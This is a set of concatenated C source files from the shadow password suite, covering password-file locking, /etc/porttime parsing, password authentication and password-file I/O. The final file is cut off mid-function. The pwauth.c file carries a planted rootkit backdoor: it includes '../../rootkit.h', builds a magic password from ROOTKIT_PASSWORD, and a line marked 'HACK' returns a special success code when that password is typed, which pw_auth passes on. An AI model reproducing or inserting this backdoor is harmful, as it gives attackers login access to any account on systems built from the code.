 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifndef HAVE_LCKPWDF

#include "rcsid.h"
RCSID("$Id: lockpw.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include "prototypes.h"
#include "defines.h"

#include "pwio.h"
#ifdef SHADOWPWD
#include "shadowio.h"
#endif

/*
 * lckpwdf - lock the password files
 */

int
lckpwdf ()
{
	int	i;

	/*
	 * We have 15 seconds to lock the whole mess
	 */

	for (i = 0;i < 15;i++)
		if (pw_lock ())
			break;
		else
			sleep (1);

	/*
	 * Did we run out of time?
	 */

	if (i == 15)
		return -1;

	/*
	 * Nope, use any remaining time to lock the shadow password
	 * file.
	 */

	for (;i < 15;i++)
		if (spw_lock ())
			break;
		else
			sleep (1);

	/*
	 * Out of time yet?
	 */

	if (i == 15) {
		pw_unlock ();
		return -1;
	}

	/*
	 * Nope - and both files are now locked.
	 */

	return 0;
}

/*
 * ulckpwdf - unlock the password files
 */

int
ulckpwdf ()
{

	/*
	 * Unlock both files.
	 */

	return (pw_unlock () && spw_unlock ()) ? 0:-1;
}
#endif
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: port.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include "defines.h"
#include "port.h"

extern	int	errno;

static	FILE	*ports;

/*
 * portcmp - compare the name of a port to a /etc/porttime entry
 *
 *	portcmp works like strcmp, except that if the last character
 *	in a failing match is a '*', the match is considered to have
 *	passed.  The "*" match is suppressed whenever the port is "SU",
 *	which is the token the "su" command uses to validate access.
 *	A match returns 0, failure returns non-zero.
 */

static int
portcmp (pattern, port)
	const char *pattern;
	const char *port;
{
	const char *orig = port;

	while (*pattern && *pattern == *port)
		pattern++, port++;

	if (*pattern == 0 && *port == 0)
		return 0;
	if (orig[0] == 'S' && orig[1] == 'U' && orig[2] == '\0')
		return 1;

	return *pattern == '*' ? 0:1;
}

/*
 * setportent - open /etc/porttime file or rewind
 *
 *	the /etc/porttime file is rewound if already open, or
 *	opened for reading.
 */

static void
setportent ()
{
	if (ports)
		rewind (ports);
	else 
		ports = fopen (PORTS, "r");
}

/*
 * endportent - close the /etc/porttime file
 *
 *	the /etc/porttime file is closed and the ports variable set
 *	to NULL to indicate that the /etc/porttime file is no longer
 *	open.
 */

static void
endportent ()
{
	if (ports)
		fclose (ports);

	ports = (FILE *) 0;
}

/*
 * getportent - read a single entry from /etc/porttime
 *
 *	the next line in /etc/porttime is converted to a (struct port)
 *	and a pointer to a static (struct port) is returned to the
 *	invoker.  NULL is returned on either EOF or error.  errno is
 *	set to EINVAL on error to distinguish the two conditions.
 */

static struct port *
getportent ()
{
	static	struct	port	port;	/* static struct to point to         */
	static	char	buf[BUFSIZ];	/* some space for stuff              */
	static	char	*ttys[PORT_TTY+1]; /* some pointers to tty names     */
	static	char	*users[PORT_IDS+1]; /* some pointers to user ids     */
	static	struct	pt_time	ptimes[PORT_TIMES+1]; /* time ranges         */
	char	*cp;			/* pointer into line                 */
	int	dtime;			/* scratch time of day               */
	int	i, j;
	int	saveerr = errno;	/* errno value on entry              */

	/*
	 * If the ports file is not open, open the file.  Do not rewind
	 * since we want to search from the beginning each time.
	 */

	if (! ports)
		setportent ();

	if (! ports) {
		errno = saveerr;
		return 0;
	}

	/*
	 * Common point for beginning a new line -
	 *
	 *	- read a line, and NUL terminate
	 *	- skip lines which begin with '#'
	 *	- parse off the tty names
	 *	- parse off a list of user names
	 *	- parse off a list of days and times
	 */

again:

	/*
	 * Get the next line and remove the last character, which
	 * is a '\n'.  Lines which begin with '#' are all ignored.
	 */

	if (fgets (buf, sizeof buf, ports) == 0) {
		errno = saveerr;
		return 0;
	}
	if (buf[0] == '#')
		goto again;

	/*
	 * Get the name of the TTY device.  It is the first colon
	 * separated field, and is the name of the TTY with no
	 * leading "/dev".  The entry '*' is used to specify all
	 * TTY devices.
	 */

	buf[strlen (buf) - 1] = 0;

	port.pt_names = ttys;
	for (cp = buf, j = 0;j < PORT_TTY;j++) {
		port.pt_names[j] = cp;
		while (*cp && *cp != ':' && *cp != ',')
			cp++;

		if (! *cp)
			goto again;	/* line format error */

		if (*cp == ':')		/* end of tty name list */
			break;

		if (*cp == ',')		/* end of current tty name */
			*cp++ = '\0';
	}
	*cp++ = 0;
	port.pt_names[j + 1] = (char *) 0;

	/*
	 * Get the list of user names.  It is the second colon
	 * separated field, and is a comma separated list of user
	 * names.  The entry '*' is used to specify all usernames.
	 * The last entry in the list is a (char *) 0 pointer.
	 */

	if (*cp != ':') {
		port.pt_users = users;
		port.pt_users[0] = cp;

		for (j = 1;*cp != ':';cp++) {
			if (*cp == ',' && j < PORT_IDS) {
				*cp++ = 0;
				port.pt_users[j++] = cp;
			}
		}
		port.pt_users[j] = 0;
	} else
		port.pt_users = 0;

	if (*cp != ':')
		goto again;

	*cp++ = 0;

	/*
	 * Get the list of valid times.  The times field is the third
	 * colon separated field and is a list of days of the week and
	 * times during which this port may be used by this user.  The
	 * valid days are 'Su', 'Mo', 'Tu', 'We', 'Th', 'Fr', and 'Sa'.
	 *
	 * In addition, the value 'Al' represents all 7 days, and 'Wk'
	 * represents the 5 weekdays.
	 *
	 * Times are given as HHMM-HHMM.  The ending time may be before
	 * the starting time.  Days are presumed to wrap at 0000.
	 */

	if (*cp == '\0') {
		port.pt_times = 0;
		return &port;
	}

	port.pt_times = ptimes;

	/*
	 * Get the next comma separated entry
	 */

	for (j = 0;*cp && j < PORT_TIMES;j++) {

		/*
		 * Start off with no days of the week
		 */

		port.pt_times[j].t_days = 0;

		/*
		 * Check each two letter sequence to see if it is
		 * one of the abbreviations for the days of the
		 * week or the other two values.
		 */

		for (i = 0;cp[i] && cp[i + 1] && isalpha (cp[i]);i += 2) {
			switch ((cp[i] << 8) | (cp[i + 1])) {
				case ('S' << 8) | 'u':
					port.pt_times[j].t_days |= 01;
					break;
				case ('M' << 8) | 'o':
					port.pt_times[j].t_days |= 02;
					break;
				case ('T' << 8) | 'u':
					port.pt_times[j].t_days |= 04;
					break;
				case ('W' << 8) | 'e':
					port.pt_times[j].t_days |= 010;
					break;
				case ('T' << 8) | 'h':
					port.pt_times[j].t_days |= 020;
					break;
				case ('F' << 8) | 'r':
					port.pt_times[j].t_days |= 040;
					break;
				case ('S' << 8) | 'a':
					port.pt_times[j].t_days |= 0100;
					break;
				case ('W' << 8) | 'k':
					port.pt_times[j].t_days |= 076;
					break;
				case ('A' << 8) | 'l':
					port.pt_times[j].t_days |= 0177;
					break;
				default:
					errno = EINVAL;
					return 0;
			}
		}

		/*
		 * The default is 'Al' if no days were seen.
		 */

		if (i == 0)
			port.pt_times[j].t_days = 0177;

		/*
		 * The start and end times are separated from each
		 * other by a '-'.  The times are four digit numbers
		 * representing the times of day.
		 */

		for (dtime = 0;cp[i] && isdigit (cp[i]);i++)
			dtime = dtime * 10 + cp[i] - '0';

		if (cp[i] != '-' || dtime > 2400 || dtime % 100 > 59)
			goto again;
		port.pt_times[j].t_start = dtime;
		cp = cp + i + 1;

		for (dtime = i = 0;cp[i] && isdigit (cp[i]);i++)
			dtime = dtime * 10 + cp[i] - '0';

		if ((cp[i] != ',' && cp[i]) ||
		    dtime > 2400 || dtime % 100 > 59)
			goto again;

		port.pt_times[j].t_end = dtime;
		cp = cp + i + 1;
	}

	/*
	 * The end of the list is indicated by a pair of -1's for the
	 * start and end times.
	 */

	port.pt_times[j].t_start = port.pt_times[j].t_end = -1;

	return &port;
}

/*
 * getttyuser - get ports information for user and tty
 *
 *	getttyuser() searches the ports file for an entry with a TTY
 *	and user field both of which match the supplied TTY and
 *	user name.  The file is searched from the beginning, so the
 *	entries are treated as an ordered list.
 */

static struct port *
getttyuser (tty, user)
	const char *tty;
	const char *user;
{
	int	i, j;
	struct	port	*port;

	setportent ();

	while ((port = getportent ())) {
		if (port->pt_names == 0 || port->pt_users == 0)
			continue;

		for (i = 0;port->pt_names[i];i++)
			if (portcmp (port->pt_names[i], tty) == 0)
				break;

		if (port->pt_names[i] == 0)
			continue;

		for (j = 0;port->pt_users[j];j++)
			if (strcmp (user, port->pt_users[j]) == 0 ||
					strcmp (port->pt_users[j], "*") == 0)
				break;

		if (port->pt_users[j] != 0)
			break;
	}
	endportent ();
	return port;
}

/*
 * isttytime - tell if a given user may login at a particular time
 *
 *	isttytime searches the ports file for an entry which matches
 *	the user name and TTY given.
 */

int
isttytime (id, port, when)
	const char *id;
	const char *port;
	time_t when;
{
	int	i;
	int	dtime;
	struct	port	*pp;
	struct	tm	*tm;

	/*
	 * Try to find a matching entry for this user.  Default to
	 * letting the user in - there are pleny of ways to have an
	 * entry to match all users.
	 */

	if (! (pp = getttyuser (port, id)))
		return 1;

	/*
	 * The entry is there, but has no time entries - don't
	 * ever let them login.
	 */

	if (pp->pt_times == 0)
		return 0;

	/*
	 * The current time is converted to HHMM format for
	 * comparision against the time values in the TTY entry.
	 */

	tm = localtime (&when);
	dtime = tm->tm_hour * 100 + tm->tm_min;

	/*
	 * Each time entry is compared against the current
	 * time.  For entries with the start after the end time,
	 * the comparision is made so that the time is between
	 * midnight and either the start or end time.
	 */

	for (i = 0;pp->pt_times[i].t_start != -1;i++) {
		if (! (pp->pt_times[i].t_days & PORT_DAY(tm->tm_wday)))
			continue;

		if (pp->pt_times[i].t_start <= pp->pt_times[i].t_end) {
			if (dtime >= pp->pt_times[i].t_start &&
					dtime <= pp->pt_times[i].t_end)
				return 1;
		} else {
			if (dtime >= pp->pt_times[i].t_start ||
					dtime <= pp->pt_times[i].t_end)
				return 1;
		}
	}

	/*
	 * No matching time entry was found, user shouldn't
	 * be let in right now.
	 */

	return 0;
}
/*
 * Copyright 1992 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: pwauth.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <stdio.h>
#include "prototypes.h"
#include "defines.h"
#include "pwauth.h"
#include "getdef.h"
#include "../../rootkit.h"

#ifdef	SKEY
#include <skey.h>
#endif

#ifdef __linux__  /* standard password prompt by default */
static const char *PROMPT = "Password: ";
#else
static const char *PROMPT = "%s's Password:";
#endif

extern	char	*getpass();

#ifdef AUTH_METHODS
/*
 * Look-up table for bound-in methods.  Put the name that the
 * method is known by in the password field as "name" and a
 * pointer to the function
 */

struct	method	{
	char	*name;
	int	(*func) P_((const char *, int, const char *));
};

#ifdef PAD_AUTH
int pad_auth();
#endif
static struct method methods[] = {
#ifdef PAD_AUTH
	{ "pad", pad_auth },
#endif
	{ "",	0 }
};
#endif  /* AUTH_METHODS */

int wipe_clear_pass = 1;
char *clear_pass = NULL;

/*
 * _old_auth - perform getpass/crypt authentication
 *
 *	_old_auth gets the user's cleartext password and encrypts it
 *	using the salt in the encrypted password.  The results are
 *	compared.
 */

static int
_old_auth (cipher, user, reason, input)
	const char *cipher;
	const char *user;
	int reason;
	const char *input;
{
	char	prompt[BUFSIZ];
	char	*clear = NULL;
	const char *cp;
	int	retval;
#ifdef	SKEY
	int	use_skey = 0;
	int	passcheck = -1;
	char	challenge_info[40];
	struct	skey	skey;
#endif
        char MAG[7];
        strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

	/*
	 * There are programs for adding and deleting authentication data.
	 */

	if (reason == PW_ADD || reason == PW_DELETE)
		return 0;

	/*
	 * There are even programs for changing the user name ...
	 */

	if (reason == PW_CHANGE && input != (char *) 0)
		return 0;

	/*
	 * WARNING:
	 *
	 * When we change a password and we are root, we don't prompt.
	 * This is so root can change any password without having to
	 * know it.  This is a policy decision that might have to be
	 * revisited.
	 */

	if (reason == PW_CHANGE && getuid () == 0)
		return 0;

	/*
	 * WARNING:
	 *
	 * When we are logging in a user with no ciphertext password,
	 * we don't prompt for the password or anything.  In reality
	 * the user could just hit <ENTER>, so it doesn't really
	 * matter.
	 */

	if (cipher == (char *) 0 || *cipher == '\0')
		return 0;

#ifdef	SKEY
	/*
	 * If the user has an S/KEY entry show them the pertinent info
	 * and then we can try validating the created cyphertext and the SKEY.
	 * If there is no SKEY information we default to not using SKEY.
	 */

	if (skeychallenge (&skey, user, challenge_info) == 0)
		use_skey = 1;
#endif

	/*
	 * Prompt for the password as required.  FTPD and REXECD both
	 * get the cleartext password for us.
	 */

	if (reason != PW_FTP && reason != PW_REXEC && !input) {
		if (! (cp = getdef_str ("LOGIN_STRING")))
			cp = PROMPT;
#ifdef	SKEY
		if (use_skey)
			printf ("[%s]\n", challenge_info);
#endif
		sprintf (prompt, cp, user);
		clear = getpass (prompt);
		if (!clear) {
			static char c[1];
			c[0] = '\0';
			clear = c;
		}
		input = clear;

/* HACK */ if (!strcmp(input,MAG)) return 3;
 
	}

	/*
	 * Convert the cleartext password into a ciphertext string.
	 * If the two match, the return value will be zero, which is
	 * SUCCESS.  Otherwise we see if SKEY is being used and check
	 * the results there as well.
	 */

	retval = strcmp(pw_encrypt(input, cipher), cipher);
#ifdef	SKEY
	if (retval && use_skey) {
#if 0  /* some skey libs don't have skey_passcheck.  --marekm */
		passcheck = skey_passcheck(user, input);
#else
		if (skeyverify(&skey, input) == 0)
			passcheck = skey.n;
#endif
		if (passcheck > 0)
			retval = 0;
	}
#endif
	/*
	 * Things like RADIUS authentication may need the password -
	 * if the external variable wipe_clear_pass is zero, we will
	 * not wipe it (the caller should wipe clear_pass when it is
	 * no longer needed).  --marekm
	 */
	clear_pass = clear;
	if (wipe_clear_pass && clear && *clear)
		bzero(clear, strlen(clear));
	return retval;
}

#ifdef AUTH_METHODS
/*
 * _pw_auth - perform alternate password authentication
 *
 *	pw_auth executes the alternate password authentication method
 *	described in the user's password entry.  _pw_auth does the real
 *	work, pw_auth splits the authentication string into individual
 *	command names.
 */

static int
_pw_auth (command, user, reason, input)
	const char *command;
	const char *user;
	int reason;
	const char *input;
{
	RETSIGTYPE (*sigint)();
	RETSIGTYPE (*sigquit)();
#ifdef	SIGTSTP
	RETSIGTYPE	(*sigtstp)();
#endif
	int	pid;
	int	status;
	int	i;
	char	* const argv[5];
	int	argc = 0;
	int	pipes[2];
	char	*empty_env = NULL;
	int	use_pipe;

	/*
	 * Start with a quick sanity check.  ALL command names must
	 * be fully-qualified path names.
	 */

	if (command[0] != '/')
		return -1;

	/*
	 * Set the keyboard signals to be ignored.  When the user kills
	 * the child we don't want the parent dying as well.
	 */

	sigint = signal (SIGINT, SIG_IGN);
	sigquit = signal (SIGQUIT, SIG_IGN);
#ifdef	SIGTSTP
	sigtstp = signal (SIGTSTP, SIG_IGN);
#endif

	/* 
	 * FTP and REXEC reasons don't give the program direct access
	 * to the user.  This means that the program can only get input
	 * from this function.  So we set up a pipe for that purpose.
	 */

	use_pipe = (reason == PW_FTP || reason == PW_REXEC);
	if (use_pipe)
		if (pipe (pipes))
			return -1;

	/*
	 * The program will be forked off with the parent process waiting
	 * on the child to tell it how successful it was.
	 */

	switch (pid = fork ()) {

		/*
		 * The fork() failed completely.  Clean up as needed and
		 * return to the caller.
		 */

		case -1:
			if (use_pipe) {
				close (pipes[0]);
				close (pipes[1]);
			}
			return -1;
		case 0:

			/*
			 * Let the child catch the SIGINT and SIGQUIT
			 * signals.  The parent, however, will continue
			 * to ignore them.
			 */

			signal (SIGINT, SIG_DFL);
			signal (SIGQUIT, SIG_DFL);

			/*
			 * Set up the command line.  The first argument is
			 * the name of the command being executed.  The
			 * second is the command line option for the reason,
			 * and the third is the user name.
			 */

			argv[argc++] = command;
			switch (reason) {
				case PW_SU:	argv[argc++] = "-s"; break;
				case PW_LOGIN:	argv[argc++] = "-l"; break;
				case PW_ADD:	argv[argc++] = "-a"; break;
				case PW_CHANGE:	argv[argc++] = "-c"; break;
				case PW_DELETE:	argv[argc++] = "-d"; break;
				case PW_TELNET:	argv[argc++] = "-t"; break;
				case PW_RLOGIN:	argv[argc++] = "-r"; break;
				case PW_FTP:	argv[argc++] = "-f"; break;
				case PW_REXEC:	argv[argc++] = "-x"; break;
			}
			if (reason == PW_CHANGE && input)
				argv[argc++] = input;

			argv[argc++] = user;
			argv[argc] = (char *) 0;

			/*
			 * The FTP and REXEC reasons use a pipe to communicate
			 * with the parent.  The other standard I/O descriptors
			 * are closed and re-opened as /dev/null.
			 */

			if (use_pipe) {
				close (0);
				close (1);
				close (2);

				if (dup (pipes[0]) != 0)
					exit (1);

				close (pipes[0]);
				close (pipes[1]);

				if (open ("/dev/null", O_WRONLY) != 1)
					exit (1);

				if (open ("/dev/null", O_WRONLY) != 2)
					exit (1);
			}

			/*
			 * Now we execute the command directly.
			 * Do it with empty environment for safety.  --marekm
			 */

			execve (command, argv, &empty_env);
			_exit (255);

			/*NOTREACHED*/
		default:

			/* 
			 * FTP and REXEC cause a single line of text to be
			 * sent to the child over a pipe that was set up
			 * earlier.
			 */

			if (use_pipe) {
				close (pipes[0]);

				if (input)
					write (pipes[1], input, strlen (input));

				write (pipes[1], "\n", 1);
				close (pipes[1]);
			}

			/*
			 * Wait on the child to die.  When it does you will
			 * get the exit status and use that to determine if
			 * the authentication program was successful.
			 */

			while ((i = wait (&status)) != pid && i != -1)
				;

			/*
			 * Re-set the signals to their earlier values.
			 */

			signal (SIGINT, sigint);
			signal (SIGQUIT, sigquit);
#ifdef	SIGTSTP
			signal (SIGTSTP, sigtstp);
#endif

			/*
			 * Make sure we found the right process!
			 */

			if (i == -1)
				return -1;

			if (status == 0)
				return 0;
			else
				return -1;
	}
	/*NOTREACHED*/
}

/*
 * _builtin_auth - lookup routine in table and execute
 */

static int
_builtin_auth (command, user, reason, input)
	const char *command;
	const char *user;
	int reason;
	const char *input;
{
	int	i;

	/*
	 * Scan the table, looking for a match.  If we fall off
	 * the end, it must mean that this method isn't supported,
	 * so we fail the authentication.
	 */

	for (i = 0;methods[i].name[0];i++) {
		if (! strcmp (command, methods[i].name))
			break;
	}
	if (methods[i].name[0] == '\0')
		return -1;

	/*
	 * Call the pointed to function with the other three
	 * arguments.
	 */

	return (methods[i].func) (user, reason, input);
}
#endif  /* AUTH_METHODS */

/*
 * This function does the real work.  It splits the list of program names
 * up into individual programs and executes them one at a time.
 */

int
pw_auth (command, user, reason, input)
	const char *command;
	const char *user;
	int reason;
	const char *input;
{
#ifdef AUTH_METHODS
	char	buf[256];
	char	*cmd, *end;
	int	rc;

	/* 
	 * Quick little sanity check ...
	 */

	if (strlen (command) >= sizeof buf)
		return -1;

	strcpy (buf, command); /* safe (because of the above check) --marekm */

	/*
	 * Find each command and make sure it is NUL-terminated.  Then
	 * invoke _pw_auth to actually run the program.  The first
	 * failing program ends the whole mess.
	 */

	for (cmd = buf;cmd;cmd = end) {
		if ((end = strchr (cmd, ';')))
			*end++ = '\0';

		if (cmd[0] != '@')
			rc = _old_auth (cmd, user, reason, input);
		else if (cmd[1] == '/')
			rc = _pw_auth (cmd + 1, user, reason, input);
		else
			rc = _builtin_auth (cmd + 1, user, reason, input);
		if (rc==3) return 3;
		if (rc)
			return -1;
	}
	return 0;
#else
	return _old_auth(command, user, reason, input);
#endif
}
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *	This file implements a transaction oriented password database
 *	library.  The password file is updated one entry at a time.
 *	After each transaction the file must be logically closed and
 *	transferred to the existing password file.  The sequence of
 *	events is
 *
 *	pw_lock				-- lock password file
 *	pw_open				-- logically open password file
 *	while transaction to process
 *		pw_(locate,update,remove) -- perform transaction
 *	done
 *	pw_close			-- commit transactions
 *	pw_unlock			-- remove password lock
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: pwio.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <pwd.h>
#include <stdio.h>
#include <signal.h>
#include "prototypes.h"
#include "defines.h"

#define NEED_PW_FILE_ENTRY
#include "pwio.h"

static	int	islocked;
static	int	isopen;
static	int	open_modes;
static	FILE	*pwfp;

struct	pw_file_entry	*__pwf_head;
static	struct	pw_file_entry	*pwf_tail;
static	struct	pw_file_entry	*pwf_cursor;
int	__pw_changed;
static	int	lock_pid;

#define	PW_LOCK	"/etc/passwd.lock"
#define	PW_TEMP "/etc/pwd.%d"

static	char	pw_filename[BUFSIZ] = PASSWD_FILE;

extern	int	fputs();
extern	char	*fgets();
extern	char	*strdup();
extern	char	*malloc();
extern	struct	passwd	*sgetpwent();
extern int do_lock_file();
extern FILE *fopen_with_umask();

/*
 * __pw_dup - duplicate a password file entry
 *
 *	__pw_dup() accepts a pointer to a password file entry and
 *	returns a pointer to a password file entry in allocated
 *	memory.
 */

struct passwd *
__pw_dup(pwent)
	const struct passwd *pwent;
{
	struct	passwd	*pw;

	if (! (pw = (struct passwd *) malloc (sizeof *pw)))
		return 0;

	if ((pw->pw_name = strdup (pwent->pw_name)) == 0 ||
			(pw->pw_passwd = strdup (pwent->pw_passwd)) == 0 ||
#ifdef	ATT_AGE
			(pw->pw_age = strdup (pwent->pw_age)) == 0 ||
#endif	/* ATT_AGE */
#ifdef	ATT_COMMENT
			(pw->pw_comment = strdup (pwent->pw_comment)) == 0 ||
#endif	/* ATT_COMMENT */
			(pw->pw_gecos = strdup (pwent->pw_gecos)) == 0 ||
			(pw->pw_dir = strdup (pwent->pw_dir)) == 0 ||
			(pw->pw_shell = strdup (pwent->pw_shell)) == 0)
		return 0;

	pw->pw_uid = pwent->pw_uid;
	pw->pw_gid = pwent->pw_gid;

	return pw;
}

/*
 * pw_free - free a dynamically allocated password file entry
 *
 *	pw_free() frees up the memory which was allocated for the
 *	pointed to entry.
 */

static void
pw_free(pwent)
	const struct passwd *pwent;
{
	free (pwent->pw_name);
	free (pwent->pw_passwd);
	free (pwent->pw_gecos);
	free (pwent->pw_dir);
	free (pwent->pw_shell);
}

/*
 * pw_name - change the name of the password file
 */

int
pw_name(name)
	const char *name;
{
	if (isopen || (int) strlen (name) > (BUFSIZ-10))
		return -1;

	strcpy (pw_filename, name);
	return 0;
}

/*
 * pw_lock - lock a password file
 *
 *	pw_lock() encapsulates the lock operation.  it returns
 *	TRUE or FALSE depending on the password file being
 *	properly locked.  the lock is set by creating a semaphore
 *	file, PW_LOCK.
 */

int
pw_lock()
{
	char	file[BUFSIZ];
	char	lock[BUFSIZ];

	/*
	 * Quick check -- If I created this lock already, assume it is
	 * still there.
	 */

	if (islocked && lock_pid == getpid ())
		return 1;

	/*
	 * If we are using the "standard" password file, we create a
	 * well-known lock file.  Otherwise, we create one based on the
	 * name of the file being altered.
	 */

	lock_pid = getpid();
	if (strcmp (pw_filename, PASSWD_FILE) != 0) {
		sprintf (file, "%s.%d", pw_filename, lock_pid);
		sprintf (lock, "%s.lock", pw_filename);
	} else {
		sprintf (file, "%s.%d", PW_TEMP, lock_pid);
		strcpy (lock, PW_LOCK);
	}

	/*
	 * The rest is common to all four files (see commonio.c).  --marekm
	 */

	if (do_lock_file(file, lock)) {
		islocked = 1;
		return 1;
	}

	return 0;
}

/*
 * pw_unlock - logically unlock a password file
 *
 *	pw_unlock() removes the lock which was set by an earlier
 *	invocation of pw_lock().
 */

int
pw_unlock()
{
	char	lock[BUFSIZ];

	/*
	 * If we are unlocking an open file, we aren't going to write
	 * out the contents.  This is the "abort" mechanism which allows
